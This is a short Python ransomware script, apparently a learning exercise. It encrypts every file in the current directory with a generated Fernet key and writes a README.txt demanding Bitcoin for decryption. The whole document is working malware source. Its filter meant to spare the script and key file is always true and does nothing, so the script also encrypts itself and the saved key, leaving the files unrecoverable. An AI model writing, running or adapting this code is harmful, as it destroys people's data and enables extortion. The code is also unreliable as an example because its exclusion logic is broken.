#Import operating system library and Fernet (a symmetric encryption method)
from importlib.resources import contents
import os
from cryptography.fernet import Fernet

#Create empty list to store files in
files = []
current_directory = os.getcwd()

#Create for loop to discover all files (not directories) in the current directory and add them to the files list
for file in os.listdir(current_directory):
    #Filter out ransomencrypt.py and thekey.key so they are not added to the files list and encryped
    if file == "ransomencrypt.py" or "thekey.key":
        continue
for file in os.listdir(current_directory):
    if os.path.isfile(os.path.join(current_directory, file)):
        files.append(file)
print(files)

#Generate key and assign it to variable "key"
key = Fernet.generate_key()

#Save generated key to file, wb for "write binary"
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#Encrypt all files in files list
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        print(contents)
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
        print(contents_encrypted)

# Define the file content
file_content = "Please send x BTC to this address and we will decrypt your files. Thank you kindly."

# Get the current working directory
current_directory = os.getcwd()

# Specify the file path
file_path = os.path.join(current_directory, "README.txt")

# Create and write to the file
with open(file_path, "w") as file:
    file.write(file_content)


